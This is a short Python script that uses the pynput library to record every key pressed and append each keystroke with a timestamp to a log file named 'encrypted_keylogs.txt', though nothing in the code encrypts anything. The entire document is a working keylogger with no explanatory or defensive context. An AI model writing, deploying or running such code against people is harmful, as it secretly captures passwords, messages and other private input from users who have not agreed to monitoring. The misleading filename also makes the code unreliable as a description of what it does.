from pynput import keyboard

import logging

logging.basicConfig(filename="encrypted_keylogs.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s", encoding="utf-8")

def on_press(key):
    logging.info(str(key))

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()